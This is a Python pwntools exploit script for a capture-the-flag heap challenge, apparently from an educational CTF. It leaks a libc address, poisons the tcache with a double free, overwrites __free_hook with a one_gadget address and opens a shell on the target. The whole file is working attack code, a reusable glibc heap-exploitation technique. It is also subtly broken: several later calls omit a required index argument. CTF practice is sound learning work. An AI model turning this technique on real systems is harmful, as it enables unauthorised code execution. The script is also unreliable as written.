from pwn import *

p = process("./nonono")
#p = remote("edu-ctf.csie.org", 10178)
l = ELF("./libc.so.6")
# use gdb, find the remain addr -  libc addr
offset =   0x00007f2ba5b9eca0  - 0x00007f2ba57b3000

def add(size, note, IDX):
	p.sendlineafter('>>', '1')
	p.sendlineafter('IDX : ', str(IDX))
	p.sendlineafter('SIZE : ', str(size))
	p.sendlineafter('CONTENT: ', note)

def show(index):
	p.sendlineafter('>> ', '2')
	p.sendlineafter('IDX :', str(index))

def delete(index):
	p.sendlineafter('>> ', '3')
	p.sendlineafter('IDX : ', str(index))

# 0x410 for tcache unsorted bin
add( 0x410, 'leak', 0)
# prevent unsorted bin to be merged to Top
add( 0x20 , 'a', 1)
delete(0)
pause() # time to find offset

show(0)
p.recvline()
l.address = u64( p.recv(6) + '\0\0' ) - offset
success( 'libc -> %s' % hex(l.address))

delete(1)
delete(1)
print(hex(l.sym.__free_hook))
pause()
add( 0x20, p64( l.sym.__free_hook ))
add( 0x20, 'a')
# 0x4f322 is one_gadget
add( 0x20, p64( l.address + 0x4f322))

# double free to trigger crash and libc will call __free_hook
delete(3)

p.sendline("id")
print(p.recvline())
p.interactive()
